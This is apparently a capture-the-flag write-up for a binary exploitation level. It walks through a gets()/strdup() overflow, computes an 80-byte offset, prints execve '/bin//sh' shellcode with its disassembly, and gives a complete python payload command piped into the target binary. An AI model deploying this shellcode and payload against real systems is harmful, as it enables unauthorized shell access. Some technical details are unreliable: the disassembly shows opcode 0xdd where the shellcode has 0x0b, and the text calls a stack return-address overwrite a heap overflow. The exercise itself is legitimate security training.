# level02

When using `gdb`, we notice there is a call to `p` a function. Let's decompile it with [dogbolt](dogbolt.org). We will see that `p` contains : 

* ```fflush(stdout):``` Ensures that any buffered data for the standard output (stdout) is flushed and written out. 
* ```gets(s):``` Reads a string from standard input (stdin) into the buffer s. This function is unsafe because it does not check the size of the input, allowing buffer overflow if the input exceeds 63 characters (plus the null terminator).   
* ```puts(s):``` Prints the string s to stdout.   
* ```strdup(s):``` Returns a pointer to a new string that is a duplicate of s.   

Here, a vulnerability is an overflow on `gets()` as the size of the buffer is not checked (it's deprecated now). But that is actually protected by the check you have after that exits if the memory is overwritten. So we move on to another vulnerable function that is `strdup`. To recap, as per [this source](https://nativealgorithms.medium.com/what-is-the-difference-between-stack-and-heap-buffer-overflow-attacks-70746773e16e), 

>The **stack** is an area of memory used by a program subroutine (a program’s set of instructions). It includes a return address. The return address is specified in the stack when a program contains a function call or again a subroutine. When the function is called, after its complete execution it has to return back to the original program. The return address contains the address of the instruction to return to.

So an attacker can use a buffer overflow to change the return address, allowing the attacker to run any arbitrary code on the system. Now, in our case since we can't use the stack..

>The **heap** refers to the memory available and designated to execute a task. Buffer memory is a temporary storage area in the main memory (RAM) that stores data transferring between two or more devices or between an application and a device. Buffering compensates for the difference in transfer speeds between the sender and receiver of the data.

Therefore, attackers can exploit memory allocation by sending data to overflow the buffer. So here, we need to complete a **heap based overflow attack**. One issue, in comparison to the previous exercice, is that there is no other function in the executable that e.g opens a shell. So we need to manually send malicious code in the overflow not simply redirect to an existing function.   

We know the buffer is of size `76` as per the decompiled code. Alternatively, we can use the `metasploit` patterns to find this value. Then we add the address of the EBP, and we know we'll need to overflow between 81-84 on the `EIP` that is after the `EPB`. 

```
Offset = Size of buffer + Size of saved EBP
       = 76 bytes + 4 bytes
       = 80 bytes
```

At this stage, [Leo](https://github.com/SERAC-SGM) created a script in asm to open a shell. [This](https://repo.zenk-security.com/Techniques%20d.attaques%20%20.%20%20Failles/Les%20shellcodes.pdf) is the source to his fat knowledge, pretty cool read. Upon disassembling the malicious code, we get the machine code of the asm instructions also called the *opcodes* in the second column below, giving the following string : 

```\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80```

```
$ objdump -d shellcode

shellcode:     file format elf32-i386


Disassembly of section .text:

08049000 <_start>:
8049000:	31 c0                	xor    %eax,%eax
8049002:	31 db                	xor    %ebx,%ebx
8049004:	31 c9                	xor    %ecx,%ecx
8049006:	31 d2                	xor    %edx,%edx
8049008:	52                   	push   %edx
8049009:	68 6e 2f 73 68       	push   $0x68732f6e
804900e:	68 2f 2f 62 69       	push   $0x69622f2f
8049013:	89 e3                	mov    %esp,%ebx
8049015:	52                   	push   %edx
8049016:	53                   	push   %ebx
8049017:	89 e1                	mov    %esp,%ecx
8049019:	b0 dd                	mov    $0xdd,%al
804901b:	cd 80                	int    $0x80
```

This string is 29 characters long so 80 (offset) - 29 = 51 characters will be needed to overflow the strdup call. Add an extra 4 bytes with malloc's address and an extra 4 to overflow its EIP (malloc's return address). 

```
$ python -c 'print "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80"+"\x90"*51+"\x44\x84\x04\x08"+"\x08\xa0\x04\x08"' > payload
$ cat payload - | ./level2
```
